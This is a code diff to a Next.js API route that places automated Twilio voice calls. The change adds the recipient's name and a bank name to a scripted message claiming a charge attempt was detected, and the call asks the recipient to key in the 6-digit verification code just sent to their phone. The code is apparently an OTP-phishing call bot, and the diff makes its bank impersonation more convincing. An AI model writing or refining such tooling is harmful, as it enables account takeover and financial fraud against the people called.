@@ -1,4 +1,3 @@
-//app/api/make-otp-call/route.ts
 import { NextRequest, NextResponse } from 'next/server';
 import twilio from 'twilio';
 import { Redis } from '@upstash/redis';
@@ -12,15 +11,26 @@ const client = twilio(ACCOUNT_SID, AUTH_TOKEN);
 const redis = Redis.fromEnv();
 
 export async function POST(req: NextRequest) {
-  const { phoneNumber } = await req.json();
+  const { phoneNumber, bank, callerName } = await req.json();
 
   try {
     const response = new twilio.twiml.VoiceResponse();
     
+    // Construct the initial message with optional bank and name details
+    let initialMessage = 'Hello.';
+    if (callerName) {
+      initialMessage += ` ${callerName},`;
+    }
+    initialMessage += ' We detected an attempt to charge your account';
+    if (bank) {
+      initialMessage += ` with ${bank}`;
+    }
+    initialMessage += '. If this wasn\'t you, please enter the 6-digit verification code sent to your phone to secure your account.';
+
     response.say({
       voice: 'Polly.Joanna',
       language: 'en-US'
-    }, 'Hello. We detected an attempt to charge your account. If this wasn\'t you, please enter the 6-digit verification code sent to your phone to secure your account. Thank you.');
+    }, initialMessage);
 
     // First gather attempt
     const gather1 = response.gather({
@@ -67,18 +77,22 @@ export async function POST(req: NextRequest) {
     // Store the call information in Redis with more detailed logging
     await redis.set(`call:${call.sid}`, JSON.stringify({ 
       phoneNumber, 
+      bank,
+      callerName,
       status: call.status,
       createdAt: new Date().toISOString()
     }), { ex: 3600 });
 
     // Log the call SID for easier debugging
-    console.log(`Call initiated. Call SID: ${call.sid}, Phone Number: ${phoneNumber}`);
+    console.log(`Call initiated. Call SID: ${call.sid}, Phone Number: ${phoneNumber}, Bank: ${bank || 'N/A'}, Caller Name: ${callerName || 'N/A'}`);
 
     return NextResponse.json({ 
       callSid: call.sid, 
       status: call.status,
       debugInfo: {
         phoneNumber,
+        bank,
+        callerName,
         createdAt: new Date().toISOString()
       }
     });
